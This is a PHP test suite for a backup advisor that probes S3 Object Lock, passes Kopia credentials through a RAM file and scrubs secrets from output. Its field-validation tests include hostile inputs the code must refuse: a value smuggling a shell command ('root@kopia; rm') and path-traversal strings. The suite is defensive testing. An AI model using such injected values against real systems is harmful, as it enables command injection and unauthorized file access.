/**
 * Ransomware protection: does the bucket keep S3 Object Lock? AWS's own Signature V4 example, the region
 * an endpoint names, what each answer means (enabled / off / unsupported / unknown and why), how the
 * request is made (Amazon virtual-hosted and signed again for the bucket's region, elsewhere path style)
 */
function testAdvisorObjectLock(): void
{
    $e = hash('sha256', '');
    same('s3 signature: AWS\'s own example (GET Bucket Lifecycle, 2013-05-24)',
        'AWS4-HMAC-SHA256 Credential=AKIAIOSFODNN7EXAMPLE/20130524/us-east-1/s3/aws4_request, SignedHeaders=host;x-amz-content-sha256;x-amz-date, '
        . 'Signature=fea454ca298b7da1c68078a5d1bdbfbbe0d65c699e0f91ac7a200a0136783543',
        advisorS3Sign('GET', '/', ['lifecycle' => ''], ['host' => 'examplebucket.s3.amazonaws.com', 'x-amz-date' => '20130524T000000Z', 'x-amz-content-sha256' => $e],
            'AKIAIOSFODNN7EXAMPLE', 'wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY', 'us-east-1', '20130524T000000Z'));
    same('s3 region: from the endpoint', ['eu-central-1', 'eu-central-003', 'eu-central-2', 'us-east-1', 'eu-central-1', 'fsn1', null, 'us-west-2'],
        array_map('advisorS3Region', ['s3.eu-central-1.amazonaws.com', 's3.eu-central-003.backblazeb2.com', 's3.eu-central-2.wasabisys.com', 's3.amazonaws.com',
            's3.eu-central-1.s4.mega.io', 'fsn1.your-objectstorage.com', 'minio.lan:9000', 's3.dualstack.us-west-2.amazonaws.com']));

    $ans = fn (int $status, string $body, array $headers = []) => ['status' => $status, 'headers' => $headers, 'body' => $body, 'error' => $status ? null : 'timeout'];
    $err = fn (string $code) => "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<Error><Code>$code</Code><Message>x</Message></Error>";
    $on = '<ObjectLockConfiguration xmlns="http://s3.amazonaws.com/doc/2006-03-01/"><ObjectLockEnabled>Enabled</ObjectLockEnabled>';
    foreach ([
        'enabled, with the bucket\'s own rule' => [$ans(200, "$on<Rule><DefaultRetention><Mode>GOVERNANCE</Mode><Days>14</Days></DefaultRetention></Rule></ObjectLockConfiguration>"), 's3',
                                                  ['state' => 'enabled', 'mode' => 'GOVERNANCE', 'days' => 14]],
        'enabled, a rule in years'            => [$ans(200, "$on<Rule><DefaultRetention><Mode>COMPLIANCE</Mode><Years>1</Years></DefaultRetention></Rule></ObjectLockConfiguration>"), 'aws',
                                                  ['state' => 'enabled', 'mode' => 'COMPLIANCE', 'days' => 365]],
        'enabled, no rule'                    => [$ans(200, "$on</ObjectLockConfiguration>"), 'b2', ['state' => 'enabled', 'mode' => null, 'days' => null]],
        'off: the bucket made without it'     => [$ans(404, $err('ObjectLockConfigurationNotFoundError')), 'aws', ['state' => 'off']],
        'off: a configuration, not enabled'   => [$ans(200, '<ObjectLockConfiguration></ObjectLockConfiguration>'), 'minio', ['state' => 'off']],
        'unsupported: not implemented'        => [$ans(501, $err('NotImplemented')), 's3', ['state' => 'unsupported']],
        'unsupported: answered with a listing' => [$ans(200, '<ListBucketResult><Name>b1</Name></ListBucketResult>'), 's3', ['state' => 'unsupported']],
        'unsupported: MEGA S4, an unclear no' => [$ans(403, $err('AccessDenied')), 'mega', ['state' => 'unsupported']],
        'unknown: the keys refused'           => [$ans(403, $err('SignatureDoesNotMatch')), 'mega', ['state' => 'unknown', 'why' => 'keys']],
        'unknown: not allowed to read it'     => [$ans(403, $err('AccessDenied')), 'b2', ['state' => 'unknown', 'why' => 'denied']],
        'unknown: no such bucket'             => [$ans(404, $err('NoSuchBucket')), 'wasabi', ['state' => 'unknown', 'why' => 'no_bucket']],
        'unknown: no answer'                  => [$ans(0, ''), 's3', ['state' => 'unknown', 'why' => 'unreachable']],
        // tested 2026-10-15 against versitygw 1.9 with its own self-signed VGW_CERT (curl 60) and on a plain-HTTP port (curl 35)
        'unknown: a certificate not trusted'  => [['errno' => 60] + $ans(0, ''), 'versitygw', ['state' => 'unknown', 'why' => 'certificate']],
        'unknown: no HTTPS on that port'      => [['errno' => 35] + $ans(0, ''), 'versitygw', ['state' => 'unknown', 'why' => 'no_https']],
        'unknown: refused, not a TLS matter'  => [['errno' => 7] + $ans(0, ''), 'versitygw', ['state' => 'unknown', 'why' => 'unreachable']],
        'unknown: something else'             => [$ans(500, $err('InternalError')), 's3', ['state' => 'unknown', 'why' => 'other', 'code' => 'InternalError']],
    ] as $what => [$answer, $provider, $want]) {
        same("object lock: $what", $want, advisorObjectLockState($answer, $provider));
    }

    // Amazon: virtual-hosted; signed for us-east-1 first, then for the region the bucket names
    $seen = [];
    $http = function (string $url, array $h) use (&$seen, $ans, $err, $on): array {
        $seen[] = [$url, $h];
        return count($seen) === 1 ? $ans(400, $err('AuthorizationHeaderMalformed') . '<Region>eu-west-1</Region>', ['x-amz-bucket-region' => 'eu-west-1'])
            : $ans(200, "$on</ObjectLockConfiguration>");
    };
    $keys = ['access' => 'AKIATEST', 'secret' => 'never-in-a-request'];
    $r = advisorObjectLock(['provider' => 'aws', 'endpoint' => 's3.amazonaws.com', 'region' => null, 'bucket' => 'my-backups'] + $keys, $http);
    $region = fn (int $i) => preg_match('#/\d{8}/([a-z0-9-]+)/s3/aws4_request#', (string) ($seen[$i][1]['Authorization'] ?? ''), $m) ? $m[1] : null;
    same('object lock on Amazon: virtual-hosted, signed again for the bucket\'s region, the secret key in no request',
        ['enabled', 'https://my-backups.s3.amazonaws.com/?object-lock', 'us-east-1', 'eu-west-1', false, true],
        [$r['state'], $seen[0][0] ?? null, $region(0), $region(1), str_contains(json_encode($seen), 'never-in-a-request'),
         (bool) preg_match('/^\d{8}T\d{6}Z$/D', (string) ($seen[0][1]['x-amz-date'] ?? ''))]);
    $seen = [];
    advisorObjectLock(['provider' => 'minio', 'endpoint' => 'minio.lan:9000', 'region' => null, 'bucket' => 'b.with.dots'] + $keys,
        function (string $url, array $h) use (&$seen, $ans): array {
            $seen[] = [$url, $h];
            return $ans(404, '<Error><Code>ObjectLockConfigurationNotFoundError</Code></Error>');
        });
    same('object lock elsewhere: path style, the host with its port, asked once', ['https://minio.lan:9000/b.with.dots?object-lock', 1, 'us-east-1'],
        [$seen[0][0] ?? null, count($seen), $region(0)]);
    same('object lock: https only, never anything else', 'no curl', advisorHttps('http://example.test/', [])['error']);
    // every reason the probe can give has its words in the page (desk.js lists them, en has the key)
    $js = (string) file_get_contents(dirname(__DIR__) . '/public/desks/advisor/desk.js');
    $en = json_decode((string) file_get_contents(dirname(__DIR__) . '/public/desks/advisor/lang/en.json'), true) ?: [];
    foreach (['keys', 'denied', 'no_bucket', 'certificate', 'no_https', 'unreachable', 'other'] as $why) {
        check("object lock: the reason $why has its words", isset($en["kr.why_$why"]) && ($why === 'other' || str_contains($js, "'$why'")));
    }
    // after an attack (tested 2026-10-15): a second, read-only connection to the moment before — never over the nightly one
    check('object lock: the after-an-attack command connects read-only, at a moment before, in a config of its own',
        (bool) preg_match("/pit: 'kopia --config-file=\\S+ repository connect s3 [^']*--point-in-time=[^']*--readonly'/", $js));
}

/**
 * The Consultant's partner guide (2026-10): versitygw replaced MinIO — the guide and the assistant's hints recommend no
 * MinIO any more (only the sentence that it was archived names it), the versitygw part and the partner guide exist in
 * every language with the same labels, versitygw is an offered provider that answers the Object Lock probe like AWS
 * (1.8.0's empty <Rule/> for a locked bucket, 404 ObjectLockConfigurationNotFoundError for one made without)
 */
function testAdvisorPartnerGuide(): void
{
    $pub = dirname(__DIR__) . '/public';
    $lang = fn (string $code) => json_decode((string) file_get_contents("$pub/desks/advisor/lang/$code.json"), true) ?: [];
    $en = $lang('en');
    $guide = array_values(array_filter(array_keys($en), fn ($k) => preg_match('/^(lock|partner|copy\.lock)\./', (string) $k) === 1));
    same('partner guide: the versitygw part and the partner guide exist', [],
        array_values(array_diff(['lock.vgw_title', 'lock.vgw.1', 'lock.vgw_warn', 'copy.lock.vgw_user', 'copy.lock.vgw_bucket', 'partner.title', 'partner.1', 'partner.warn'], $guide)));
    check('partner guide: lock.minio is gone', !isset($en['lock.minio']));
    foreach (['en', 'de', 'it', 'fr', 'es'] as $code) {
        $t = $lang($code);
        $texts = array_intersect_key($t, array_flip($guide)) + ['kr.storage_s3_hint' => $t['kr.storage_s3_hint'] ?? '', 'kr.lock_off' => $t['kr.lock_off'] ?? ''];
        same("partner guide/$code: every guide key", [], array_values(array_diff($guide, array_keys($t))));
        same("partner guide/$code: MinIO only where its archive is told", ['lock.vgw.1'], array_keys(array_filter($texts, fn ($v) => str_contains((string) $v, 'MinIO'))));
        $all = implode("\n", $texts);
        check("partner guide/$code: versitygw, WireGuard and Tailscale named, Unraid's VPN labels as tokens",
            substr_count($all, 'versitygw') >= 6 && str_contains($all, 'WireGuard') && str_contains($all, 'Tailscale')
            && str_contains((string) $t['partner.3'], '⟦VPN Manager⟧') && str_contains((string) $t['partner.3'], '⟦Server to server access⟧'));
    }
    check('partner guide: versitygw offered, not among the providers without Object Lock',
        in_array('versitygw', ADVISOR_S3_PROVIDERS, true) && !in_array('versitygw', ADVISOR_NO_LOCK, true));
    $js = (string) file_get_contents("$pub/desks/advisor/desk.js");
    check('partner guide: the page offers versitygw, no MinIO endpoint example', str_contains($js, "versitygw: '100.x.y.z:7070'") && !str_contains($js, 'minio.lan'));
    $ans = fn (int $status, string $body) => ['status' => $status, 'headers' => [], 'body' => $body, 'error' => null];
    same('versitygw 1.8.0: a bucket born with the lock, its empty Rule', ['state' => 'enabled', 'mode' => null, 'days' => null],
        advisorObjectLockState($ans(200, '<ObjectLockConfiguration><ObjectLockEnabled>Enabled</ObjectLockEnabled><Rule></Rule></ObjectLockConfiguration>'), 'versitygw'));
    same('versitygw: a bucket made without the lock', ['state' => 'off'],
        advisorObjectLockState($ans(404, '<Error><Code>ObjectLockConfigurationNotFoundError</Code><Message>Object Lock configuration does not exist for this bucket.</Message></Error>'), 'versitygw'));
}

/**
 * The Consultant's Kopia setup: the user's keys and password go from the web side through a RAM
 * file (gone once read) to Kopia's stdin — end to end with a stand-in for docker and Kopia: no
 * secret in any file but that one (and Kopia's own config), in no log, no state, no answer, no ps.
 */
function testAdvisorSecrets(): void
{
    $tmp = hardeningTmp('advisor-secrets');
    $inbox = "$tmp/inbox";
    mkdir($inbox, 0700);
    $put = function (string $name, string $text, int $mode = 0600) use ($inbox): string {
        file_put_contents("$inbox/$name.secret", $text);
        chmod("$inbox/$name.secret", $mode);
        return $name;
    };
    $id = str_repeat('a', 32);
    same('secret: taken', ['password' => 'pw'], advisorSecretTake($put($id, '{"password":"pw"}'), $inbox));
    check('secret: gone once taken', !file_exists("$inbox/$id.secret"));
    foreach (['open to others' => fn () => $put($id, '{"password":"pw"}', 0644), 'a wrong name' => fn () => '../inbox/x',
              'unknown' => fn () => str_repeat('b', 32), 'not JSON' => fn () => $put($id, 'pw')] as $what => $make) {
        try {
            advisorSecretTake($make(), $inbox);
            check("secret refused: $what", false);
        } catch (Problem $p) {
            same("secret refused: $what", 'ad_secret_missing', $p->key);
        }
    }
    check('secret: a refused one is gone all the same', !file_exists("$inbox/$id.secret"));
    file_put_contents("$tmp/victim", 'keep');
    symlink("$tmp/victim", "$inbox/$id.secret");
    try {
        advisorSecretTake($id, $inbox);
    } catch (Problem) {
    }
    check('secret: a link is never read, only removed', !is_link("$inbox/$id.secret") && file_get_contents("$tmp/victim") === 'keep');
    chmod($inbox, 0755);
    try {
        advisorSecretTake($put($id, '{"password":"pw"}'), $inbox);
        check('secret refused: an inbox open to others', false);
    } catch (Problem $p) {
        same('secret refused: an inbox open to others', 'ad_secret_missing', $p->key);
    }
    chmod($inbox, 0700);
    touch("$inbox/" . $put(str_repeat('c', 32), '{}') . '.secret', time() - 600);
    same('secret: the sweep removes what nobody took', [1, []], [advisorInboxSweep($inbox, 120), glob("$inbox/*") ?: []]);
    same('secret: scrubbed out of what Kopia says', "ERROR invalid ••• for •••\n", advisorScrub("ERROR invalid pass\x01word-123 for AKIAXYZ\n", ['pass' => 'password-123', 'k' => 'AKIAXYZ']));

    // end to end: the web side's handover (in a process of its own, the secrets on its stdin) …
    $secrets = ['password' => 'Corr3ct-Horse-' . bin2hex(random_bytes(4)), 'access_key' => 'AKIATEST' . strtoupper(bin2hex(random_bytes(4))),
                'secret_key' => 'sk/' . bin2hex(random_bytes(12)) . '+x'];
    $web = "$tmp/web.php";
    file_put_contents($web, '<?php require ' . var_export(OFFICE_DIR . '/src/place.php', true) . '; require '
        . var_export(OFFICE_DIR . '/src/api.php', true) . '; echo apiSecretStash("advisor.kopia_repo", json_decode(stream_get_contents(STDIN), true));');
    $p = proc_open([PHP_BINARY, $web], [0 => ['pipe', 'r'], 1 => ['pipe', 'w'], 2 => ['pipe', 'w']], $pipes, null, ['OFFICE_INBOX_DIR' => $inbox, 'OFFICE_RUN_DIR' => TESTS_RUN_DIR, 'PATH' => getenv('PATH')]);
    fwrite($pipes[0], json_encode($secrets));
    fclose($pipes[0]);
    $ref = trim((string) stream_get_contents($pipes[1]));
    $webErr = (string) stream_get_contents($pipes[2]);
    proc_close($p);
    $st = @lstat("$inbox/$ref.secret");
    check('secret e2e: the web side left a 0600 file in the inbox', $st !== false && ($st['mode'] & 0777) === 0600, $webErr);
    $refused = proc_open([PHP_BINARY, $web], [0 => ['pipe', 'r'], 1 => ['pipe', 'w'], 2 => ['pipe', 'w']], $pipes2, null, ['OFFICE_INBOX_DIR' => $inbox, 'OFFICE_RUN_DIR' => TESTS_RUN_DIR]);
    fwrite($pipes2[0], json_encode(['password' => ['nested']]));
    fclose($pipes2[0]);
    check('secret e2e: the web side refuses odd shapes', str_contains((string) stream_get_contents($pipes2[1]), 'bad_request'));
    proc_close($refused);

    // … a stand-in for docker and Kopia: records hashes of what Kopia got, ps while it runs, writes its config as Kopia would
    $bin = "$tmp/bin";
    mkdir($bin);
    file_put_contents("$bin/docker", "#!/bin/sh\n# stand-in: docker exec [-i] <name> <cmd…> | docker restart …\n"
        . "case \"\$1\" in restart) exit 0;; exec) shift; [ \"\$1\" = -i ] && shift; shift; PATH=\"$bin:\$PATH\" exec \"\$@\";; esac\nexit 1\n");
    file_put_contents("$bin/kopia", "#!/bin/sh\n# stand-in for Kopia\n"
        . "[ \"\$1\" = --version ] && { echo '0.99.0 build: stand-in'; exit 0; }\n"
        . "[ \"\$1\" = maintenance ] && { printf '%s\\n' \"\$*\" >> '$tmp/maint.txt'; [ \"\$2\" = info ] && echo '{\"extendObjectLocks\":true}'; exit 0; }\n"
        . "[ \"\$1\" = repository ] && [ \"\$2\" = status ] && { if [ -e '$tmp/locked' ]; then echo '{\"blobRetention\":{\"retentionMode\":\"COMPLIANCE\",\"retentionPeriod\":2592000000000000}}'; "
        . "else echo '{\"blobRetention\":{}}'; fi; exit 0; }\n"
        . "ps -eo args > '$tmp/ps.txt'\n"
        . "printf '%s\\n' \"\$*\" > '$tmp/args.txt'\n"
        . "for v in \"\$KOPIA_PASSWORD\" \"\$AWS_ACCESS_KEY_ID\" \"\$AWS_SECRET_ACCESS_KEY\"; do printf '%s' \"\$v\" | sha256sum | cut -c1-64; done > '$tmp/got.txt'\n"
        . "if [ \"\$2\" = connect ]; then echo \"ERROR: invalid repository password \$KOPIA_PASSWORD\" >&2; exit 1; fi\n"
        . "printf '{\"storage\":{\"type\":\"s3\",\"config\":{\"bucket\":\"b1\",\"endpoint\":\"s3.example.test\",\"accessKeyID\":\"%s\",\"secretAccessKey\":\"%s\"}},\"hostname\":\"kopia\",\"username\":\"root\"}' "
        . "\"\$AWS_ACCESS_KEY_ID\" \"\$AWS_SECRET_ACCESS_KEY\" > '$tmp/config/repository.config'\n");
    chmod("$bin/docker", 0755);
    chmod("$bin/kopia", 0755);
    mkdir("$tmp/config");
    putenv("OFFICE_ADVISOR_DOCKER=$bin/docker");
    $target = ['name' => 'kopia-standin', 'image' => 'ghcr.io/imagegenius/kopia', 'webui' => 'http://192.0.2.10:51515',
               'info' => ['config' => "$tmp/config", 'sources' => ['host' => ADVISOR_SNAPSHOTS, 'target' => '/uso'], 'restore' => null, 'folders' => []]];
    $request = ['mode' => 'create', 'storage' => 's3', 'provider' => 'mega', 'endpoint' => 's3.example.test', 'bucket' => 'b1', 'prefix' => 'unraid/',
                'secret_ref' => $ref];
    $logBefore = (int) @filesize(AGENT_LOG);
    try {
        $answer = advisorKopiaRepo($request, $inbox, $target);
    } catch (Problem $p) {
        $answer = ['ok' => false, 'error' => $p->toArray()];
    }
    same('secret e2e: Kopia created and connected', true, $answer['ok'] ?? null);
    same('secret e2e: the RAM file is gone', [], glob("$inbox/*") ?: []);
    same('secret e2e: Kopia got the three secrets on its stdin', array_map(fn ($v) => hash('sha256', $v), array_values($secrets)),
        array_values(array_filter(explode("\n", (string) @file_get_contents("$tmp/got.txt")))));
    same('secret e2e: Kopia\'s arguments, no secret among them', 'repository create s3 --bucket=b1 --endpoint=s3.example.test --prefix=unraid/ --persist-credentials',
        trim((string) @file_get_contents("$tmp/args.txt")));
    same('secret e2e: the facts for the recovery sheet', ['b1', 's3.example.test', 'unraid/', 'root@kopia', '0.99.0', 'mega'],
        [$answer['facts']['bucket'] ?? null, $answer['facts']['endpoint'] ?? null, $answer['facts']['prefix'] ?? null, $answer['facts']['client'] ?? null,
         $answer['facts']['version'] ?? null, $answer['facts']['provider'] ?? null]);
    $ps = (string) @file_get_contents("$tmp/ps.txt");
    check('secret e2e: ps was looked at while Kopia ran', str_contains($ps, 'repository create s3'));
    same('secret e2e: the repository\'s format says it — no Object Lock', ['mode' => null], $answer['facts']['lock'] ?? 'not said');

    // … and the second time a connect that fails, Kopia repeating the password: cleaned out of the answer
    file_put_contents("$inbox/" . ($ref2 = str_repeat('d', 32)) . '.secret', json_encode($secrets));
    chmod("$inbox/$ref2.secret", 0600);
    try {
        advisorKopiaRepo(['mode' => 'connect', 'secret_ref' => $ref2] + $request, $inbox, $target);
        $fail = null;
    } catch (Problem $p) {
        $fail = $p;
    }
    same('secret e2e: a failing Kopia is a Problem', 'ad_kopia_failed', $fail?->key);
    $said = (string) ($fail?->params['output'] ?? '');
    check('secret e2e: its words without the password', str_contains($said, 'invalid repository password •••') && !str_contains($said, $secrets['password']));
    same('secret e2e: the RAM file is gone after a failure too', [], glob("$inbox/*") ?: []);

    // ransomware protection: asking the bucket about Object Lock (step probe) — the keys through RAM, signed here, nothing created …
    $requests = [];
    $bucketSays = ['status' => 200, 'headers' => [], 'error' => null,
                   'body' => '<?xml version="1.0"?><ObjectLockConfiguration><ObjectLockEnabled>Enabled</ObjectLockEnabled></ObjectLockConfiguration>'];
    $http = function (string $url, array $headers) use (&$requests, &$bucketSays): array {
        $requests[] = [$url, $headers];
        return $bucketSays;
    };
    $stash = function (string $ref, array $sec) use ($inbox): string {
        file_put_contents("$inbox/$ref.secret", json_encode($sec));
        chmod("$inbox/$ref.secret", 0600);
        return $ref;
    };
    @unlink("$tmp/args.txt");
    $probe = advisorKopiaRepo(['step' => 'probe', 'secret_ref' => $stash(str_repeat('e', 32), ['access_key' => $secrets['access_key'], 'secret_key' => $secrets['secret_key']])]
        + $request, $inbox, $target, $http);
    $auth = (string) ($requests[0][1]['Authorization'] ?? '');
    same('lock probe: the bucket keeps it — offered, 30 days (7 to 365); nothing created; the RAM file gone',
        ['enabled', [ADVISOR_LOCK_DAYS, ADVISOR_LOCK_MIN, ADVISOR_LOCK_MAX], false, []], [$probe['lock']['state'] ?? null, $probe['lock']['range'] ?? null, is_file("$tmp/args.txt"), glob("$inbox/*") ?: []]);
    same('lock probe: one signed GET ?object-lock to the endpoint typed (path style), only the access key ID in it', ['https://s3.example.test/b1?object-lock', 1, true],
        [$requests[0][0] ?? null, count($requests), str_starts_with($auth, 'AWS4-HMAC-SHA256 Credential=' . $secrets['access_key'] . '/')]);
    // … a new repository with it: asked again, created with COMPLIANCE for 30 days, the locks extended at maintenance …
    touch("$tmp/locked");
    $lockAnswer = advisorKopiaRepo(['lock_days' => '30', 'secret_ref' => $stash(str_repeat('f', 32), $secrets)] + $request, $inbox, $target, $http);
    same('lock create: Kopia\'s arguments — the retention, still no secret among them',
        'repository create s3 --bucket=b1 --endpoint=s3.example.test --prefix=unraid/ --retention-mode=COMPLIANCE --retention-period=30d --persist-credentials',
        trim((string) @file_get_contents("$tmp/args.txt")));
    same('lock create: the bucket asked again first, Kopia told to extend the locks, the facts say so (for the sheet)',
        [2, 'maintenance set --extend-object-locks=true', ['mode' => 'COMPLIANCE', 'days' => 30, 'extend' => true]],
        [count($requests), trim((string) @file_get_contents("$tmp/maint.txt")), $lockAnswer['facts']['lock'] ?? null]);
    $connectLock = advisorKopiaLock("$bin/docker", 'kopia-standin', null);
    unlink("$tmp/locked");
    same('lock connect: an existing repository\'s lock read from its format, whether Kopia extends it from its maintenance',
        [['mode' => 'COMPLIANCE', 'days' => 30, 'extend' => true], ['mode' => null]], [$connectLock, advisorKopiaLock("$bin/docker", 'kopia-standin', null)]);
    // … and a bucket that says no on the second look: nothing created
    $bucketSays = ['status' => 404, 'headers' => [], 'error' => null, 'body' => '<Error><Code>ObjectLockConfigurationNotFoundError</Code></Error>'];
    @unlink("$tmp/args.txt");
    try {
        advisorKopiaRepo(['lock_days' => 30, 'secret_ref' => $stash(str_repeat('0', 32), $secrets)] + $request, $inbox, $target, $http);
        $lockFail = null;
    } catch (Problem $p) {
        $lockFail = $p->key;
    }
    same('lock create: no Object Lock on the second look — refused before Kopia, the RAM file gone', ['ad_lock_off', false, []], [$lockFail, is_file("$tmp/args.txt"), glob("$inbox/*") ?: []]);
    $leaks = [];
    foreach ($requests as [$url, $headers]) {
        foreach (['secret_key', 'password'] as $k) {
            if (str_contains($url . json_encode($headers), $secrets[$k])) {
                $leaks[] = "$k in a request to the bucket";
            }
        }
    }
    $look = function (string $dir) use (&$look, &$leaks, $secrets, $tmp) {
        foreach (array_diff(scandir($dir) ?: [], ['.', '..']) as $n) {
            $path = "$dir/$n";
            if (is_link($path) || $path === "$tmp/config/repository.config") {   // Kopia's own config holds them, as when set up by hand
                continue;
            }
            if (is_dir($path)) {
                $look($path);
                continue;
            }
            $text = (string) @file_get_contents($path);
            foreach ($secrets as $k => $v) {
                if (str_contains($text, $v)) {
                    $leaks[] = "$k in $path";
                }
            }
        }
    };
    $look($tmp);
    $look(DATA_DIR);
    foreach ($secrets as $k => $v) {
        if (str_contains($ps, $v)) {
            $leaks[] = "$k in ps";
        }
        if (str_contains(json_encode([$answer, $fail?->params, $probe, $lockAnswer]), $v)) {
            $leaks[] = "$k in an answer";
        }
    }
    same('secret e2e: no secret in any file (data folder, log, state, the test\'s folders), in ps or an answer', [], $leaks);
    check('secret e2e: the log says what happened, nothing more', str_contains((string) @file_get_contents(AGENT_LOG, false, null, $logBefore), 'Kopia repository create (s3) in kopia-standin - exit 0'));
    $kept = (string) @file_get_contents("$tmp/config/repository.config");
    check('secret e2e: Kopia\'s own config keeps the connection (its job)', str_contains($kept, $secrets['access_key']));
    putenv('OFFICE_ADVISOR_DOCKER');

    // the request's fields: each checked
    $k = ['info' => ['folders' => [['host' => '/mnt/disks/usb/kopia', 'target' => '/local']]]];
    $base = ['mode' => 'create', 'storage' => 's3', 'endpoint' => 's3.example.test', 'bucket' => 'b1'];
    $good = ['password' => 'long-enough-pw', 'access_key' => 'AKIA1', 'secret_key' => 'secret-key-1'];
    foreach ([['endpoint', ['endpoint' => 'https://s3.example.test']], ['endpoint', ['endpoint' => "s3.exa\nmple.test"]], ['bucket', ['bucket' => 'b']],
              ['prefix', ['prefix' => '../x']], ['prefix', ['prefix' => '/abs']], ['mode', ['mode' => 'delete']], ['region', ['region' => 'eu central']],
              ['password', [], ['password' => 'short']], ['password', [], ['password' => "two\nlines-password"]], ['secret_key', [], ['secret_key' => 'with space key']],
              ['path', ['storage' => 'filesystem', 'path' => '/config/repo']], ['path', ['storage' => 'filesystem', 'path' => '/local/../etc']],
              ['client', ['mode' => 'connect', 'client' => 'root@kopia; rm']], ['lock_days', ['lock_days' => '6']], ['lock_days', ['lock_days' => '366']],
              ['lock_days', ['lock_days' => '30d']], ['lock_days', ['mode' => 'connect', 'lock_days' => 30]],
              ['lock_days', ['storage' => 'filesystem', 'path' => '/local/repo', 'lock_days' => 30]]] as $case) {
        [$want, $over, $sec] = $case + [2 => []];
        try {
            advisorKopiaSpec($over + $base, $sec + $good, $k);
            check("kopia field refused: $want " . json_encode($over + $sec), false);
        } catch (Problem $p) {
            same("kopia field refused: $want " . json_encode($over + $sec), $want, $p->params['field'] ?? null);
        }
    }
    $fs = advisorKopiaSpec(['storage' => 'filesystem', 'path' => '/local/repo/'] + $base, $good, $k);
    same('kopia field: a folder under a writable path', ['/local/repo', '/mnt/disks/usb/kopia/repo', ['create', 'filesystem', '--path=/local/repo', '--persist-credentials']],
        [$fs['path'], $fs['path_host'], $fs['args']]);
    same('kopia field: connect with another user@host', 'root@homeserver', advisorKopiaSpec(['mode' => 'connect', 'client' => 'root@homeserver'] + $base, $good, $k)['client']);
    $locked = advisorKopiaSpec(['lock_days' => '45'] + $base, $good, $k);
    same('kopia field: Object Lock for 45 days', [['mode' => 'COMPLIANCE', 'days' => 45], ['create', 's3', '--bucket=b1', '--endpoint=s3.example.test', '--retention-mode=COMPLIANCE', '--retention-period=45d', '--persist-credentials']],
        [$locked['lock'], $locked['args']]);
    hardeningRm($tmp);
}

// ===================================================================== strings

function langFile(string $file): array
{
    $j = json_decode((string) @file_get_contents($file), true);
    if (!is_array($j)) {
        check("valid JSON: $file", false);
        return [];
    }
    unset($j['_meta']);
    return $j;
}

/** The {name} placeholders of a text or of all forms of a plural, sorted */
function langPlaceholders(mixed $v): array
{
    $found = [];
    foreach (is_array($v) ? $v : [$v] as $s) {
        if (is_string($s) && preg_match_all('/\{(\w+)\}/', $s, $m)) {
            $found = array_merge($found, $m[1]);
        }
    }
    $found = array_values(array_unique($found));
    sort($found);
    return $found;
}

/** A plural: {"one": …, "other": …} with plural categories only (Intl.PluralRules), "other" always there */
function langPluralOk(mixed $v): bool
{
    if (!is_array($v) || !isset($v['other'])) {
        return false;
    }
    foreach ($v as $cat => $s) {
        if (!in_array($cat, ['zero', 'one', 'two', 'few', 'many', 'other'], true) || !is_string($s)) {
            return false;
        }
    }
    return true;
}

function testStrings(): void
{
    $pub = OFFICE_DIR . '/public';
    $sets = ['' => "$pub/lang"];
    foreach (glob("$pub/desks/*/lang") ?: [] as $dir) {
        $sets[basename(dirname($dir))] = $dir;
    }
    $complete = ['de', 'it', 'fr', 'es'];   // need every English key in every set; other languages may leave keys out (English fills in)
    $en = [];
    foreach ($sets as $desk => $dir) {
        $de = langFile("$dir/de.json");
        $e = langFile("$dir/en.json");
        $where = $desk === '' ? 'office' : $desk;
        same("$where: only in German", [], array_values(array_diff(array_keys($de), array_keys($e))));
        same("$where: only in English", [], array_values(array_diff(array_keys($e), array_keys($de))));
        foreach ($e as $k => $v) {
            $en[$desk === '' ? $k : "$desk.$k"] = true;
        }
        same("$where: English plurals well-formed", [], array_keys(array_filter($e, fn ($v) => is_array($v) && !langPluralOk($v))));

        // every other language: no keys English lacks, the same placeholders, plurals where English has them
        $codes = array_map(fn ($f) => basename($f, '.json'), glob("$dir/*.json") ?: []);
        foreach (array_diff(array_unique(array_merge($complete, $codes)), ['en']) as $code) {
            $l = $code === 'de' ? $de : langFile("$dir/$code.json");   // a missing file of a complete language fails here
            if ($code !== 'de') {   // German's keys are compared above
                same("$where/$code: keys English lacks", [], array_values(array_diff(array_keys($l), array_keys($e))));
                if (in_array($code, $complete, true)) {
                    same("$where/$code: English keys missing", [], array_values(array_diff(array_keys($e), array_keys($l))));
                }
            }
            $shape = $placeholders = [];
            foreach ($l as $k => $v) {
                if (!array_key_exists($k, $e)) {
                    continue;
                }
                if (is_array($e[$k]) ? !langPluralOk($v) : !is_string($v)) {
                    $shape[] = $k;
                }
                if (langPlaceholders($v) !== langPlaceholders($e[$k])) {
                    $placeholders[] = $k;
                }
            }
            same("$where/$code: plurals and texts shaped like English", [], $shape);
            same("$where/$code: placeholders like English", [], $placeholders);
        }
    }
    foreach (glob("$pub/lang/*.json") ?: [] as $file) {
        $meta = json_decode((string) @file_get_contents($file), true)['_meta'] ?? [];
        check(basename($file) . ': _meta has name and locale', is_string($meta['name'] ?? null) && $meta['name'] !== ''
            && is_string($meta['locale'] ?? null) && $meta['locale'] !== '');
    }

    // texts asked for by the pages: T('key') in a desk, t('key') / Office.t('key') anywhere
    foreach (glob("$pub/desks/*/desk.js") ?: [] as $file) {
        $desk = basename(dirname($file));
        $js = (string) file_get_contents($file);
        preg_match_all("/(?<![.\\w])T\\(\\s*'([a-z0-9_.]+)'\\s*[,)]/", $js, $m);
        foreach (array_unique($m[1]) as $k) {
            check("$desk/desk.js asks for $desk.$k", isset($en["$desk.$k"]));
        }
        preg_match_all("/\\bOffice\\.t\\(\\s*'([a-z0-9_.]+)'\\s*[,)]/i", $js, $m);
        foreach (array_unique($m[1]) as $k) {
            check("$desk/desk.js asks for $k", isset($en[$k]));
        }
    }
    $core = preg_replace(['#/\*.*?\*/#s', '#^\s*//.*$#m'], '', (string) file_get_contents("$pub/assets/core.js"));   // not in comments
    preg_match_all("/(?<![.\\w])t\\(\\s*'([a-z0-9_.]+)'\\s*[,)]/", $core, $m);
    foreach (array_unique($m[1]) as $k) {
        check("core.js asks for $k", isset($en[$k]));
    }

    // the caretaker shows every finding as <desk>.check.<id> (and _how, if any)
    $sources = [];
    foreach (glob(OFFICE_DIR . '/agent/desks/*.php') ?: [] as $file) {
        $sources[basename($file, '.php')][] = $file;
    }
    $sources['snapshot'][] = OFFICE_DIR . '/agent/lib/snapshotplans.php';
    // Mr. Restori's drill lives in a file of its own beside his desk (agent/desks/restore-drill.php)
